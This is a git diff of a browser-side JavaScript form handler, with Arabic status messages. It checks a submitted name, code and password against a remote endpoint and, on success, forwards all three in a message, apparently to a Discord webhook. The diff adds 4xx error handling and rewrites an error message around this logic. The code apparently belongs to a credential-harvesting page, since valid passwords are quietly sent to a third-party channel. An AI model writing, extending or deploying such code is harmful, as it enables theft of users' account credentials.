@@ -42,6 +42,7 @@ document.getElementById("sendButton").addEventListener("click", async () => {
     };
 
     showStatusMessage("جار التحقق من المعلومات...", Colors.WAIT);
+    
     const response = await fetch(baseURL, {
         method: "POST",
         body: JSON.stringify(payload)
@@ -49,6 +50,13 @@ document.getElementById("sendButton").addEventListener("click", async () => {
 
     // send to Discord if ok code is received
     let status = response.status;
+    let jsonData = await response.json();
+
+    if (400 <= status && status <= 499) {
+        showStatusMessage(jsonData.status.message, Colors.FAIL);
+        return
+    }
+
     if (200 <= status && status <= 299) {
         const message = {
             content: `\`name :: ${name}\ncode :: ${code}\npassword :: ${password}\``
@@ -72,6 +80,6 @@ document.getElementById("sendButton").addEventListener("click", async () => {
             console.error("Erorr:", error);
         }
     } else {
-        showStatusMessage("الرمز او كلمة المرور غير صحيحة", Colors.FAIL);
+        showStatusMessage(`حدث خطأ أثناء إنشاء الاتصال (ERROR CODE: ${status})`, Colors.FAIL);
     }
 })
